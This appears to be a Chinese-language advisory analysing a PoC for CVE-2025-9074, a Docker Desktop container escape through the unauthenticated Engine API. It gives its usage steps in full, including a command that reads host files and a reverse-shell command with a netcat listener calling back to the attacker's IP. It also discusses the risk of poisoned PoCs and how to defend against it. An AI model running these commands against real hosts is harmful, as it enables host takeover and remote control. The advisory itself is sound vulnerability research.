## CVE-2025-9074 - Docker Desktop 容器逃逸

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸

**影响应用:** Docker Desktop

**危害等级:** 严重

**CVSS评分:** 9.3

**影响版本:** Docker Desktop < 4.44.3

**利用条件:** 无需认证，容器内部可访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074 Docker Desktop容器逃逸漏洞分析

此PoC代码有效演示了CVE-2025-9074漏洞的利用，这是一个存在于Docker Desktop（版本低于4.44.3）中的严重容器逃逸漏洞。该漏洞的核心问题在于，Docker Engine API（默认监听在`http://192.168.65.7:2375`）对运行在Docker Desktop环境中的容器是**未经验证**即可访问的。这意味着，一旦攻击者成功在一个容器内部获得代码执行权限，他们便可以轻易地与宿主机的Docker Engine API交互，从而绕过容器隔离机制。

**POC有效性分析 (约500字)**
该漏洞的利用无需任何认证，且不受Docker Desktop中诸如“Enhanced Container Isolation (ECI)”或“Expose daemon on tcp://localhost:2375 without TLS”等安全配置的影响，这极大地降低了攻击门槛并扩大了攻击面。其根本原因在于Docker Engine API被错误地暴露在一个可从容器内部访问的TCP socket上。PoC代码`exploit.py`是一个用Python编写的脚本，它巧妙地利用了这一未授权访问，通过向Docker Engine API发送特定的HTTP请求来创建和管理特权容器。
对于**Windows平台**（特别是使用WSL后端的情况），此漏洞影响最为严重。攻击者可以通过PoC创建一个新的特权容器，并将宿主机的文件系统（例如`C:`盘）挂载到该特权容器内部的`/hostfs`目录。一旦文件系统被挂载，攻击者即可在特权容器内对宿主机的文件进行任意读写操作，甚至执行高权限命令，从而实现**完整的宿主机接管并获得管理权限**。例如，PoC展示了如何读取`C:/Users/Administrator/Desktop/root.txt`或列出用户目录。
对于**macOS平台**，漏洞同样允许容器操纵和潜在的后门植入，但其影响可能因macOS的安全机制（如用户权限提示）而受到一定限制。然而，这仍然是一个严重的安全威胁，可能导致数据泄露或系统配置被篡改。
值得注意的是，**Linux平台**不受此漏洞影响，因为在Linux上，Docker Engine通常通过Unix socket而不是TCP端口进行通信，且默认不向容器暴露。
该PoC代码提供了两种主要的利用模式：
1.  **命令执行模式**：允许攻击者直接在宿主机上执行任意命令，并将结果返回给攻击者。这使得攻击者能够进行侦察、数据窃取或进一步的攻击部署。
2.  **反向Shell模式**：使得攻击者可以在宿主机上建立一个交互式的反向shell，从而获得对宿主机的持久化、实时控制。
综合来看，该PoC代码逻辑清晰，功能完整，通过直接操作Docker Engine API实现了高危的容器逃逸，证明了CVE-2025-9074的严重性及可利用性。

**利用步骤 (约150字)**
1.  **环境准备**：在攻击者机器上安装Python3，并通过`pip3 install requests`安装必要的依赖库。
2.  **验证API可达性**：若已在目标容器内部，可通过执行`curl http://192.168.65.7:2375/version`来验证Docker Engine API是否可访问。
3.  **命令执行**：使用PoC脚本在宿主机上执行命令。例如，读取Windows宿主机文件：`python3 exploit.py -u http://192.168.65.7:2375 -m cmd -c "cat /hostfs/mnt/c/Users/Administrator/Desktop/root.txt"`。
4.  **反向Shell**：在攻击者机器上设置一个监听器（如`nc -lvnp 4444`），然后运行PoC以获取宿主机的反向shell：`python3 exploit.py -u http://192.168.65.7:2375 -m reverse -l <攻击者IP> -p 4444`。成功连接后，宿主机文件系统位于`/hostfs`。

**投毒风险分析 (约300字)**
本PoC代码`exploit.py`作为一项合法的安全研究成果，旨在演示CVE-2025-9074漏洞的利用方式。其代码结构清晰，主要依赖Python的`requests`库进行HTTP通信，以及`os`、`sys`等标准库进行系统交互，不包含明显的混淆、恶意外部依赖或可疑的隐藏功能。因此，从PoC代码本身的实现来看，其**直接投毒风险极低**。然而，所有公开的PoC代码都面临被恶意行为者篡改和重新发布的风险。攻击者可能在原始PoC中植入：
1.  **恶意负载**：例如勒索软件、挖矿程序、信息窃取木马等。
2.  **持久化后门**：在利用漏洞的同时，在宿主机上安装难以察觉的后门程序，以便长期控制。
3.  **数据外传逻辑**：将窃取到的敏感数据（如配置文件、证书等）秘密发送到攻击者控制的服务器。
为了最大程度地降低这种间接投毒风险，组织在利用或测试此PoC时应采取以下防御措施：
*   **严格代码审计**：在任何敏感环境中使用PoC之前，必须对其源代码进行全面而细致的审计，检查是否存在异常的网络连接、文件操作、加密操作或未知的第三方库引用。
*   **隔离环境执行**：始终在高度隔离的沙箱环境、独立的虚拟机或专用测试网络中执行PoC，确保其行为不会影响到生产系统或核心资产。
*   **网络流量监控**：在PoC运行期间，密切监控其网络通信，识别任何非预期的外部连接或异常数据传输。
*   **获取可信来源**：优先从官方或声誉良好的安全研究机构获取PoC，并验证其完整性（例如通过哈希值）。
总之，尽管本PoC本身无恶意，但对未经审计的PoC代码始终保持警惕是防御性安全研究的关键实践。

**项目地址:** 未明确提供

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
